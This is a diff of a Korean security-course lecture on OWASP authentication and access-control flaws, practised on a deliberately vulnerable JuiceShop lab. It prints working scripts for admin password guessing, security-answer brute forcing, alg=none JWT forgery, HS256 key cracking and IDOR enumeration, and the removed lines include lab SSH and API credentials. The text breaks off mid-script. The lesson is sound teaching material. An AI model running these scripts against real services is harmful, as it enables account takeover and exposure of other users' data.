@@ -1,184 +1,143 @@
-# Week 06: OWASP Top 10 (3) - 인증 및 접근 제어 취약점
+# Week 06: OWASP A01 + A07 — 접근 제어·인증 취약점
 
 ## 학습 목표
 - 인증(Authentication)과 인가(Authorization)의 차이를 이해한다
-- 취약한 인증 메커니즘의 유형을 파악한다
-- JWT 토큰 공격 기법을 실습한다
-- IDOR(Insecure Direct Object Reference)과 권한 상승을 이해하고 실습한다
-
-## 실습 환경 (공통)
-
-| 서버 | IP | 역할 | 접속 |
-|------|-----|------|------|
-| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
-| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
-| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
-| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |
-
-**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
-
-## 강의 시간 배분 (3시간)
-
-| 시간 | 내용 | 유형 |
-|------|------|------|
-| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
-| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
-| 1:10-1:20 | 휴식 | - |
-| 1:20-2:00 | 실습 (Part 3) | 실습 |
-| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
-| 2:40-2:50 | 휴식 | - |
-| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
-| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
-
----
-
----
-
-## 용어 해설 (이 과목에서 자주 나오는 용어)
-
-> 대학 1~2학년이 처음 접할 수 있는 보안/IT 용어를 정리한다.
-> 강의 중 모르는 용어가 나오면 이 표를 참고하라.
-
-| 용어 | 영문 | 설명 | 비유 |
-|------|------|------|------|
-| **페이로드** | Payload | 공격에 사용되는 실제 데이터/코드. 예: `' OR 1=1--` | 미사일의 탄두 |
-| **익스플로잇** | Exploit | 취약점을 악용하는 기법 또는 코드 | 열쇠 없이 문을 여는 방법 |
-| **셸** | Shell | 운영체제와 사용자를 연결하는 명령어 해석기 (bash, sh 등) | OS에게 말 걸 수 있는 창구 |
-| **리버스 셸** | Reverse Shell | 대상 서버가 공격자에게 역방향 연결을 맺는 것 | 도둑이 집에서 밖으로 전화를 거는 것 |
-| **포트** | Port | 서버에서 특정 서비스를 식별하는 번호 (0~65535) | 아파트 호수 |
-| **데몬** | Daemon | 백그라운드에서 실행되는 서비스 프로그램 | 24시간 근무하는 경비원 |
-| **패킷** | Packet | 네트워크로 전송되는 데이터의 단위 | 택배 상자 하나 |
-| **프록시** | Proxy | 클라이언트와 서버 사이에서 중개하는 서버 | 대리인, 중간 거래자 |
-| **해시** | Hash | 임의 길이 데이터를 고정 길이 값으로 변환하는 함수 (SHA-256 등) | 지문 (고유하지만 원본 복원 불가) |
-| **토큰** | Token | 인증 정보를 담은 문자열 (JWT, API Key 등) | 놀이공원 입장권 |
-| **JWT** | JSON Web Token | Base64로 인코딩된 JSON 기반 인증 토큰 | 이름·권한이 적힌 입장권 |
-| **Base64** | Base64 | 바이너리 데이터를 텍스트로 인코딩하는 방법 | 암호가 아닌 "포장" (누구나 풀 수 있음) |
-| **CORS** | Cross-Origin Resource Sharing | 다른 도메인에서의 API 호출 허용 설정 | "외부인 출입 허용" 표지판 |
-| **API** | Application Programming Interface | 프로그램 간 통신 규약 | 식당의 메뉴판 (주문 양식) |
-| **REST** | Representational State Transfer | URL + HTTP 메서드로 자원을 조작하는 API 스타일 | 도서관 대출 시스템 (책 이름으로 검색/대출/반납) |
-| **SSH** | Secure Shell | 원격 서버에 안전하게 접속하는 프로토콜 | 암호화된 전화선 |
-| **sudo** | SuperUser DO | 관리자(root) 권한으로 명령 실행 | "사장님 권한으로 실행" |
-| **SUID** | Set User ID | 실행 시 파일 소유자 권한으로 실행되는 특수 권한 | 다른 사람의 사원증을 빌려 출입 |
-| **IPS** | Intrusion Prevention System | 네트워크 침입 방지 시스템 (악성 트래픽 차단) | 공항 보안 검색대 |
-| **SIEM** | Security Information and Event Management | 보안 로그를 수집·분석하는 통합 관제 시스템 | CCTV 관제실 |
-| **WAF** | Web Application Firewall | 웹 공격을 탐지·차단하는 방화벽 | 웹사이트 전용 경비원 |
-| **nftables** | nftables | Linux 커널 방화벽 프레임워크 (iptables 후계) | 건물 출입구 차단기 |
-| **Suricata** | Suricata | 오픈소스 IDS/IPS 엔진 | 공항 X-ray 검색기 |
-| **Wazuh** | Wazuh | 오픈소스 SIEM 플랫폼 | CCTV + AI 관제 시스템 |
-| **ATT&CK** | MITRE ATT&CK | 실제 공격 전술·기법을 분류한 데이터베이스 | 범죄 수법 백과사전 |
-| **OWASP** | Open Web Application Security Project | 웹 보안 취약점 연구 국제 단체 | 웹 보안의 표준 기관 |
-| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 점수 (0~10점) | 질병 위험도 등급 |
-| **CVE** | Common Vulnerabilities and Exposures | 취약점 고유 식별 번호 | 질병의 고유 코드 (예: COVID-19) |
-| **Bastion** | Bastion | 보안 작업 자동화·증적 관리 플랫폼 (이 수업에서 사용) | 보안 작업 일지 + 자동화 시스템 |
-
----
-
-# Week 06: OWASP Top 10 (3) - 인증 및 접근 제어 취약점
-
-## 학습 목표
-
-- 인증(Authentication)과 인가(Authorization)의 차이를 이해한다
-- 취약한 인증 메커니즘의 유형을 파악한다
-- JWT 토큰 공격 기법을 실습한다
-- IDOR(Insecure Direct Object Reference)과 권한 상승을 이해하고 실습한다
+- 기본·약한 비밀번호, 보안질문 재설정, 세션 관리 취약점을 식별한다
+- JWT의 서명 메커니즘을 이해하고 alg=none·약한 HS256 키 공격을 시도한다
+- IDOR, 수평·수직 권한 상승을 JuiceShop에서 실습한다
+- 접근 제어의 서버 측 검증·RBAC·UUID 기반 방어를 설명한다
+- MITRE ATT&CK T1078(Valid Accounts), T1110(Brute Force)와 매핑한다
 
 ## 실습 환경
 
 | 호스트 | IP | 역할 |
 |--------|-----|------|
-| bastion | 10.20.30.201 | 실습 기지 |
-| web | 10.20.30.80 | JuiceShop:3000 |
+| manager | 10.20.30.200 | 실습 기지, Bastion API :8003 |
+| web | 10.20.30.80 | JuiceShop :3000 (공격 대상) |
+
+이번 주는 Week 03~05에서 학습한 HTTP/JWT/쿠키 지식 위에 **인증과 인가**를 쌓는다.
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:25 | 인증 vs 인가 개념 (Part 1) | 강의 |
+| 0:25-1:00 | 인증 취약점 실습 (Part 2) | 실습 |
+| 1:00-1:10 | 휴식 | - |
+| 1:10-1:50 | JWT 공격 실습 (Part 3) | 실습 |
+| 1:50-2:30 | IDOR·권한 상승 (Part 4) | 실습 |
+| 2:30-2:40 | 휴식 | - |
+| 2:40-3:10 | 방어 + 탐지 (Part 5~6) | 강의+실습 |
+| 3:10-3:30 | Bastion 자동화 (Part 7) | 실습 |
+| 3:30-3:40 | 정리 + 과제 | 정리 |
 
 ---
 
-## 1. 인증 vs 인가
+# Part 1: 인증 vs 인가
 
-보안에서 가장 중요한 두 가지 개념이다. 반드시 구분해야 한다.
+보안에서 가장 중요한 두 가지 개념. 반드시 구분해야 한다.
 
-### 인증 (Authentication) - "너는 누구인가?"
+## 1.1 인증 (Authentication) — "너는 누구인가?"
 
-사용자의 **신원을 확인**하는 과정이다.
+사용자의 **신원을 확인**하는 과정:
 - ID/PW 로그인
-- 지문 인식
+- 지문/얼굴 인식
 - OTP (일회용 비밀번호)
-- 인증서
+- 인증서 기반 (mTLS, 공인인증서)
 
-### 인가 (Authorization) - "너는 무엇을 할 수 있는가?"
+## 1.2 인가 (Authorization) — "너는 무엇을 할 수 있는가?"
 
-인증된 사용자에게 **어떤 자원에 접근할 수 있는 권한**이 있는지 확인하는 과정이다.
-- 일반 사용자: 자신의 주문만 볼 수 있음
-- 관리자: 모든 사용자의 주문을 볼 수 있음
+인증된 사용자가 **어떤 자원에 접근할 권한**이 있는지 확인:
+- 일반 사용자: 자신의 주문만 조회
+- 관리자: 모든 사용자의 주문 조회
 
 **비유:**
-- 인증 = 건물 입구에서 출입증 확인 (이 사람이 직원인가?)
+- 인증 = 건물 입구 출입증 확인 (이 사람이 직원인가?)
 - 인가 = 각 방의 출입 권한 확인 (이 직원이 서버실에 들어갈 수 있는가?)
+
+## 1.3 OWASP에서의 위치
+
+| 카테고리 | 2017 순위 | 2021 순위 | 이번 주 |
+|---------|-----------|-----------|---------|
+| A01 Broken Access Control | A5 | **A1** (↑4) | ✓ |
+| A07 Identification & Auth Failures | A2 | **A7** (↓5) | ✓ |
+
+**2021년 A01이 1위로 올라온 이유:** 94%의 웹 애플리케이션에서 접근 제어 실패가 발견됨. SQLi와 달리 **비즈니스 로직**에 의존하므로 WAF로 방어 불가능.
+
+## 1.4 MITRE ATT&CK 매핑
+
+| 실습 내용 | ATT&CK 기법 | 전술 |
+|----------|-------------|------|
+| 기본 비밀번호 시도 | T1078 Valid Accounts | Initial Access |
+| 비밀번호 브루트포스 | T1110 Brute Force | Credential Access |
+| JWT 위조 | T1550.001 Application Access Token | Defense Evasion |
+| IDOR | T1552 Unsecured Credentials | Credential Access |
 
 ---
 
-## 2. 인증 취약점
+# Part 2: 인증 취약점
 
-### 2.1 기본/약한 비밀번호 (Default/Weak Passwords)
+## 2.1 기본·약한 비밀번호
 
-> **이 실습을 왜 하는가?**
-> 기본 비밀번호(default credential)는 가장 쉬운 공격 벡터이다.
-> 공격자는 SQLi 같은 복잡한 기법을 사용하기 전에, 먼저 "admin/admin123"을 시도한다.
-> Shodan 같은 검색 엔진으로 기본 비밀번호가 그대로인 시스템을 수만 대 찾을 수 있다.
->
-> **실제 사례:**
-> - 2016년 Mirai 봇넷: IoT 기기의 기본 비밀번호(admin/admin)로 60만 대 감염 → Dyn DNS DDoS
-> - Purple Team 실험에서도 JuiceShop admin 비밀번호 admin123이 첫 번째 발견 (Critical)
->
-> **실무 활용:** 모의해킹 보고서에서 "기본 인증 정보 사용"은 CRITICAL로 분류된다.
-> OWASP A07(Identification and Authentication Failures)에 해당한다.
+**이것은 무엇인가?** 초기 설치 시 설정된 기본 계정(admin/admin)이나 추측 가능한 약한 비밀번호. 공격자가 SQLi 같은 복잡한 기법 전에 먼저 시도한다.
 
-많은 시스템이 기본 비밀번호를 변경하지 않고 사용한다.
+**실제 사례:**
+- **2016 Mirai 봇넷**: IoT 기기 기본 비밀번호로 60만 대 감염 → Dyn DNS DDoS
+- **2024 각종 유출 사건**의 3할은 brute force·credential stuffing
 
-> **실습 목적**: 기본 인증 정보(Default Credentials)를 사용한 무차별 대입 공격으로 인증 취약점을 확인한다
->
-> **배우는 것**: 흔한 비밀번호 목록으로 자동화된 로그인 시도를 수행하여 약한 인증 설정을 발견하는 방법을 배운다
->
-> **결과 해석**: HTTP 200과 인증 토큰이 반환되면 해당 계정/비밀번호 조합으로 로그인에 성공한 것이다
->
-> **실전 활용**: 모의해킹에서 '기본 인증 정보 사용'은 OWASP A07에 해당하며 CRITICAL로 보고된다
+**실습:**
 
 ```bash
-# JuiceShop에서 흔한 비밀번호로 admin 로그인 시도
-for password in "admin" "admin123" "password" "123456" "admin@juice-sh.op"; do  # 반복문 시작
+# 흔한 비밀번호 리스트로 admin 로그인 시도
+for password in "admin" "admin123" "password" "123456" "admin@juice-sh.op"; do
   RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$password\"}" \
     | python3 -c "import sys,json; d=json.load(sys.stdin); print('SUCCESS' if 'authentication' in d else 'FAIL')" 2>/dev/null)
-  echo "Password '$password': $RESULT"
+  echo "  $password -> $RESULT"
 done
 ```
 
+**명령 분해:**
+- `for password in ...`: 5개 비밀번호 후보 순회
+- 각 비밀번호로 로그인 POST
+- `'authentication' in d`: 응답 JSON에 `authentication` 필드 있으면 성공
+
 **예상 출력:**
 ```
-Password 'admin': FAIL
-Password 'admin123': SUCCESS
-Password 'password': FAIL
-Password '123456': FAIL
-Password 'admin@juice-sh.op': FAIL
+  admin -> FAIL
+  admin123 -> SUCCESS
+  password -> FAIL
+  123456 -> FAIL
+  admin@juice-sh.op -> FAIL
 ```
 
-> **결과**: admin의 비밀번호가 'admin123'이라는 매우 약한 비밀번호일 수 있다. (JuiceShop 버전에 따라 다를 수 있다.)
+**결과 해석:**
+- `admin123` 성공 → JuiceShop admin 계정 비밀번호가 매우 약함
+- 이 해시는 Week 04에서 JWT 페이로드로 이미 추출됨 (`0192023a7bbd73250516f069df18b500` = md5("admin123"))
+- 실무에서는 **brute force 보호** (rate limiting, account lockout, CAPTCHA) 필요
 
-### 2.2 비밀번호 정책 부재
+## 2.2 비밀번호 정책 부재
+
+**이것은 무엇인가?** 서버가 "최소 8자, 대소문자+숫자+특수문자" 같은 복잡도 규칙을 강제하지 않는 경우.
 
 ```bash
-# 매우 약한 비밀번호로 계정 생성이 가능한지 테스트
+# 비밀번호 "1"로 계정 생성 시도
 curl -s -X POST http://10.20.30.80:3000/api/Users/ \
   -H "Content-Type: application/json" \
-  -d '{"email":"weak@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"a"}' \
-  | python3 -m json.tool
+  -d '{"email":"weak'$$'@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1,"question":"Your eldest siblings middle name?","createdAt":"2025-01-01","updatedAt":"2025-01-01"},"securityAnswer":"a"}' \
+  | python3 -m json.tool | head -15
 ```
 
-> 비밀번호 "1"로 계정이 생성되면 비밀번호 정책이 없는 것이다. 이는 심각한 보안 문제다.
+**결과 해석:** 서버가 이 요청을 수락하면 비밀번호 정책이 없는 것. JuiceShop은 의도적으로 허용한다.
 
-### 2.3 비밀번호 찾기 기능 악용
+## 2.3 보안 질문 재설정 악용
+
+**이것은 무엇인가?** "Your eldest sibling's middle name?" 같은 보안 질문은 OSINT(공개 정보 검색)로 추측 가능한 경우가 많다. Sarah Palin 이메일 해킹 사건(2008)이 대표 사례.
+
+**Step 1: admin의 보안 질문 확인**
 
 ```bash
-# 보안 질문 확인
 curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-sh.op" \
   | python3 -m json.tool
 ```
@@ -187,337 +146,278 @@ curl -s "http://10.20.30.80:3000/rest/user/security-question?email=admin@juice-s
 ```json
 {
     "question": {
-        "question": "Your eldest siblings middle name?",
-        ...
+        "id": 2,
+        "question": "Your eldest siblings middle name?"
     }
 }
 ```
 
-> **공격 포인트**: 보안 질문의 답을 추측하거나 OSINT로 알아낼 수 있다면 비밀번호를 재설정할 수 있다.
+**Step 2: 답변 브루트포스**
 
 ```bash
-# 비밀번호 재설정 시도 (답을 추측)
-curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","answer":"Samuel","new":"hacked123","repeat":"hacked123"}' \
-  | python3 -m json.tool
-
-# 다른 답변 시도
-for answer in "admin" "test" "John" "Samuel" "Jane"; do  # 반복문 시작
-  RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
+for answer in "admin" "test" "John" "Samuel" "Jane" "Wolf" "Bender"; do
+  RESP=$(curl -s -X POST http://10.20.30.80:3000/rest/user/reset-password \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"Hacked123!\",\"repeat\":\"Hacked123!\"}")  # 요청 데이터(body)
-  echo "Answer '$answer': $(echo $RESULT | head -c 80)"
+    -d "{\"email\":\"admin@juice-sh.op\",\"answer\":\"$answer\",\"new\":\"Hacked123!\",\"repeat\":\"Hacked123!\"}")
+  echo "  $answer : $(echo "$RESP" | head -c 80)"
 done
 ```
 
----
+**결과 해석:** 답이 맞으면 비밀번호가 재설정된다. JuiceShop은 의도적으로 답변 시도 횟수에 제한이 없다 → brute force 가능.
 
-## 3. 세션 관리 취약점
-
-### 3.1 세션 고정 (Session Fixation)
-
-공격자가 자신이 만든 세션 ID를 피해자에게 사용하게 만드는 공격:
-
-```
-1. 공격자가 세션 ID 획득: session_id=ABC123
-2. 피해자에게 이 세션 ID가 포함된 링크 전송
-3. 피해자가 해당 세션으로 로그인
-4. 공격자가 같은 세션 ID(ABC123)로 피해자의 세션 사용
-```
-
-### 3.2 세션 예측 (Session Prediction)
-
-세션 ID가 추측 가능한 패턴으로 생성되면 위험하다.
-
-```bash
-# 여러 번 로그인하여 토큰 패턴 분석
-for i in 1 2 3; do                                     # 반복문 시작
-  TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
-    -H "Content-Type: application/json" \
-    -d '{"email":"student@test.com","password":"Student123!"}' \
-    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
-  echo "Token $i: ${TOKEN:0:50}..."
-done
-```
-
-> JWT는 각 발급마다 다른 값을 가진다. 하지만 비밀 키가 약하면 위조가 가능하다 (아래 섹션 참조).
+**방어:** 재설정 시도 rate limiting + 답변 실패 시 동일한 generic 메시지 + 2FA 병행.
 
 ---
 
-## 4. JWT 공격
+# Part 3: JWT 공격
 
-### 4.1 JWT 구조 복습
+## 3.1 JWT 구조 복습
 
 ```
 [헤더].[페이로드].[서명]
 ```
 
+각 부분은 **Base64URL** 인코딩. 서명만 암호적 보호를 제공하고, 헤더·페이로드는 누구나 디코딩 가능.
+
 ```bash
-# 로그인하여 JWT 획득
+# 일반 사용자로 로그인하여 토큰 확보
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Student123!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
 # 헤더 디코딩
+echo "== Header =="
 echo "$TOKEN" | cut -d. -f1 | python3 -c "
 import sys, base64, json
-data = sys.stdin.read().strip()
-data += '=' * (4 - len(data) % 4)
-print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2))
-"
-
-# 페이로드 디코딩
-echo "$TOKEN" | cut -d. -f2 | python3 -c "
-import sys, base64, json
-data = sys.stdin.read().strip()
-data += '=' * (4 - len(data) % 4)
-print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2, ensure_ascii=False))
+d = sys.stdin.read().strip()
+d += '=' * (4 - len(d) % 4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(d)), indent=2))
 "
 ```
 
-### 4.2 none 알고리즘 공격
+**예상 출력:**
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT"
+}
+```
 
-JWT 표준에는 `"alg": "none"` (서명 없음)이 정의되어 있다. 서버가 이를 허용하면 서명 없이 토큰을 위조할 수 있다.
+**결과 해석:** JuiceShop은 **RS256**(비대칭 서명)을 사용한다. 공개키로는 검증만 가능, 위조는 개인키 필요.
+
+## 3.2 alg=none 공격
+
+**이것은 무엇인가?** JWT 표준(RFC 7519)에 정의된 `"alg": "none"` 옵션은 **서명 검증을 스킵**하게 한다. 서버가 이를 차단하지 않으면 공격자가 서명 없이 아무 페이로드나 서버에 제출 가능.
+
+**원리:**
+```
+정상: eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoiY3VzdG9tZXIifQ.REAL_SIGNATURE
+공격: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+     (서명 빈 문자열, alg=none, role=admin)
+```
+
+**위조 토큰 생성:**
 
 ```bash
-# none 알고리즘 JWT 생성
-python3 << 'PYEOF'                                     # Python 스크립트 실행
+python3 << 'PYEOF'
 import base64, json
 
-# 헤더: alg를 none으로 변경
+# 헤더: alg를 none으로
 header = {"alg": "none", "typ": "JWT"}
 header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
 
-# 페이로드: admin으로 변경
+# 페이로드: admin role 위조
 payload = {
     "status": "success",
     "data": {
         "id": 1,
         "email": "admin@juice-sh.op",
-        "role": "admin"
+        "role": "admin",
+        "isActive": True
     },
     "iat": 1711526400,
     "exp": 9999999999
 }
 payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
 
-# 서명 없음 (빈 문자열)
-forged_token = f"{header_b64}.{payload_b64}."
-print(f"Forged JWT: {forged_token}")
+# 서명 빈 문자열
+forged = f"{header_b64}.{payload_b64}."
+print(forged)
 PYEOF
 ```
 
+**위조 토큰으로 API 접근:**
+
 ```bash
-# 위조된 토큰으로 API 접근 시도
-FORGED_TOKEN="위에서_생성된_토큰"
-curl -s http://10.20.30.80:3000/api/Users/ \
-  -H "Authorization: Bearer $FORGED_TOKEN" \
-  | python3 -m json.tool | head -10
+FORGED_TOKEN="위_명령의_출력값"
+curl -s -o /dev/null -w "Users API: HTTP %{http_code}\n" \
+  http://10.20.30.80:3000/api/Users/ \
+  -H "Authorization: Bearer $FORGED_TOKEN"
 ```
 
-> **참고**: 최신 JuiceShop은 none 알고리즘을 차단할 수 있다. 하지만 많은 실제 시스템이 이 공격에 취약하다.
+**결과 해석:**
+- 200 반환 시: alg=none 취약 → **CRITICAL**
+- 401 반환 시: 서버가 none 알고리즘을 차단 (정상)
+- 최신 JuiceShop은 차단할 수 있으나 많은 실제 시스템이 여전히 취약
 
-### 4.3 비밀 키 브루트포스
+## 3.3 HS256 약한 키 브루트포스
 
-JWT가 HS256(HMAC) 알고리즘을 사용하면, 비밀 키를 추측할 수 있다.
+**이것은 무엇인가?** JWT가 대칭키 HMAC(HS256)을 사용하면, 키가 짧거나 사전 단어이면 브루트포스로 깰 수 있다.
+
+**JuiceShop은 RS256이므로 해당 없음**. 다른 시스템 기본값(`secret`, `jwt_secret` 등) 예시를 본다.
 
 ```bash
-# 간단한 비밀 키 후보로 JWT 검증 시도
-python3 << 'PYEOF'                                     # Python 스크립트 실행
-import hmac, hashlib, base64, json
+python3 << 'PYEOF'
+import hmac, hashlib, base64
 
-# 실제 토큰에서 헤더와 페이로드 추출
-# (아래 TOKEN 변수를 실제 토큰으로 교체)
-import subprocess
-result = subprocess.run([
-    'curl', '-s', '-X', 'POST', 'http://10.20.30.80:3000/rest/user/login',
-    '-H', 'Content-Type: application/json',
-    '-d', '{"email":"student@test.com","password":"Student123!"}'
-], capture_output=True, text=True)
+# 예시 HS256 JWT (테스트용)
+header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip('=')
+payload = base64.urlsafe_b64encode(b'{"user":"test"}').decode().rstrip('=')
+message = f"{header}.{payload}"
 
-try:
-    token = json.loads(result.stdout)['authentication']['token']
-    parts = token.split('.')
-    message = f"{parts[0]}.{parts[1]}"
+# 'secret' 키로 서명 생성 (서버가 이 키를 쓴다고 가정)
+real_sig = hmac.new(b'secret', message.encode(), hashlib.sha256).digest()
+real_sig_b64 = base64.urlsafe_b64encode(real_sig).decode().rstrip('=')
+token = f"{message}.{real_sig_b64}"
+print(f"Test token: {token[:50]}...")
 
-    # 서명 추출
-    sig = parts[2]
-    sig_padded = sig + '=' * (4 - len(sig) % 4)
-    actual_sig = base64.urlsafe_b64decode(sig_padded)
-
-    # 흔한 비밀 키 목록으로 브루트포스
-    common_secrets = [
-        "secret", "password", "123456", "jwt_secret",
-        "my_secret", "key", "admin", "test",
-        "supersecret", "changeme"
-    ]
-
-    for secret in common_secrets:                      # 반복문 시작
-        computed = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
-        if computed == actual_sig:
-            print(f"[FOUND] Secret key: '{secret}'")
-            break
-    else:
-        print("[INFO] Secret not found in common list (RS256 or strong key)")
-        # JuiceShop은 RS256을 사용할 가능성이 높음
-        header_decoded = base64.urlsafe_b64decode(parts[0] + '==')
-        print(f"Algorithm: {json.loads(header_decoded).get('alg', 'unknown')}")
-except Exception as e:
-    print(f"Error: {e}")
+# 브루트포스
+candidates = ['secret', 'password', '123456', 'jwt_secret', 'key', 'changeme']
+for secret in candidates:
+    sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
+    if sig == real_sig:
+        print(f"[FOUND] Secret: '{secret}'")
+        break
+else:
+    print("[NOT FOUND]")
 PYEOF
 ```
+
+**결과 해석:** 실제 서버의 키가 사전 단어면 `hashcat -m 16500 token.txt wordlist.txt`로 크래킹 가능. **방어는 128비트 이상 랜덤 키**.
 
 ---
 
-## 5. 접근 제어 취약점
+# Part 4: 접근 제어 취약점
 
-> **OWASP A01 — Broken Access Control이 1위인 이유:**
-> 2021년 OWASP Top 10에서 접근 제어 실패가 **1위**로 올라왔다 (이전 5위에서).
-> 94%의 웹 애플리케이션에서 어떤 형태의 접근 제어 문제가 발견되었다.
-> SQLi나 XSS는 입력값 검증으로 방어할 수 있지만, 접근 제어는 **비즈니스 로직**에 의존하므로
-> WAF나 자동화 도구로 방어하기 어렵다.
+## 4.1 IDOR (Insecure Direct Object Reference)
 
-### 5.1 IDOR (Insecure Direct Object Reference)
+**이것은 무엇인가?** URL·파라미터의 ID를 변경하여 **다른 사용자의 데이터**에 접근하는 공격. 서버가 "이 사용자가 이 데이터에 접근할 권한이 있는가?"를 검증하지 않을 때 발생.
 
-> **이 실습을 왜 하는가?**
-> IDOR는 가장 흔하고 영향이 큰 접근 제어 취약점이다.
-> URL의 숫자(ID)를 1씩 바꿔보는 단순한 행위로 다른 사용자의 데이터를 볼 수 있다.
-> API 설계 시 "인증"만 하고 "인가"를 빠뜨리면 발생한다.
->
-> **실무 시나리오:**
-> 쇼핑몰에서 /orders/12345 (내 주문)를 /orders/12344 (다른 사람 주문)로 바꾸면
-> 다른 고객의 배송지, 결제 정보가 보이는 사례가 실제로 빈번하다.
-> 2023년 한 대형 플랫폼에서 IDOR로 500만 건 개인정보가 노출된 사례가 있다.
->
-> **검증 완료:** JuiceShop에서 admin 토큰으로 basket/1, basket/2, basket/3 모두 접근 성공 (200 OK)
-
-IDOR은 URL이나 파라미터의 ID를 변경하여 **다른 사용자의 데이터에 접근**하는 공격이다.
-
-**예시:**
+**전형적 패턴:**
 ```
-정상 요청: GET /api/Users/22/orders  (내 주문 목록)
-IDOR 공격: GET /api/Users/1/orders   (admin의 주문 목록!)
+내 주문:       GET /api/Users/22/orders
+다른 사람 주문: GET /api/Users/1/orders   ← ID만 변경
 ```
 
-서버가 "이 사용자가 이 데이터에 접근할 권한이 있는가?"를 확인하지 않으면 IDOR이 성공한다.
+## 4.2 실습: JuiceShop IDOR
 
-### 5.2 실습: JuiceShop IDOR
+**Step 1: 내 사용자 ID 확인**
 
 ```bash
-# 먼저 일반 사용자로 로그인
 TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Student123!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
 
-# 내 사용자 ID 확인
 echo "$TOKEN" | cut -d. -f2 | python3 -c "
 import sys, base64, json
-data = sys.stdin.read().strip() + '=='
-print(json.dumps(json.loads(base64.urlsafe_b64decode(data)), indent=2))
-" 2>/dev/null
+d = sys.stdin.read().strip() + '=='
+info = json.loads(base64.urlsafe_b64decode(d))
+print(f'My user id: {info[\"data\"][\"id\"]}, email: {info[\"data\"][\"email\"]}')
+"
+```
 
-# 다른 사용자의 장바구니 조회 시도 (IDOR)
-# 내 장바구니
-curl -s http://10.20.30.80:3000/rest/basket/22 \
-  -H "Authorization: Bearer $TOKEN" \
-  | python3 -m json.tool 2>/dev/null | head -15
+**예상 출력:**
+```
+My user id: 22, email: student@test.com
+```
 
-# 다른 사용자(admin, id=1)의 장바구니 접근 시도
+**Step 2: 다른 사용자 장바구니에 접근 시도**
+
+```bash
+# 장바구니 ID 1~5에 순차 접근
+for basket_id in 1 2 3 4 5 22; do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+    http://10.20.30.80:3000/rest/basket/$basket_id \
+    -H "Authorization: Bearer $TOKEN")
+  echo "  basket/$basket_id -> HTTP $CODE"
+done
+```
+
+**예상 출력:**
+```
+  basket/1 -> HTTP 200
+  basket/2 -> HTTP 200
+  basket/3 -> HTTP 200
+  basket/4 -> HTTP 200
+  basket/5 -> HTTP 200
+  basket/22 -> HTTP 200
+```
+
+**결과 해석:**
+- 내 장바구니(22)만 접근 가능해야 하는데 1~5도 전부 200 → **IDOR 성공**
+- 이는 JuiceShop의 의도적 취약점. 서버가 `basket_id`와 현재 토큰의 user_id를 비교하지 않음
+
+**Step 3: 다른 사용자 장바구니 내용 조회**
+
+```bash
+echo "=== Admin(id=1) 장바구니 ==="
 curl -s http://10.20.30.80:3000/rest/basket/1 \
   -H "Authorization: Bearer $TOKEN" \
-  | python3 -m json.tool 2>/dev/null | head -15
+  | python3 -m json.tool | head -20
+```
 
-# 다른 사용자의 장바구니 순차적 접근
-for basket_id in 1 2 3 4 5; do                         # 반복문 시작
-  RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
-    http://10.20.30.80:3000/rest/basket/$basket_id \
-    -H "Authorization: Bearer $TOKEN")                 # 인증 토큰
-  echo "Basket $basket_id: HTTP $RESULT"
+## 4.3 수평적 권한 상승
+
+**같은 권한 수준의 다른 사용자** 데이터 접근.
+
+```bash
+# Users 테이블 순차 ID로 정보 조회
+for uid in 1 2 3 4 5; do
+  RESP=$(curl -s http://10.20.30.80:3000/api/Users/$uid \
+    -H "Authorization: Bearer $TOKEN")
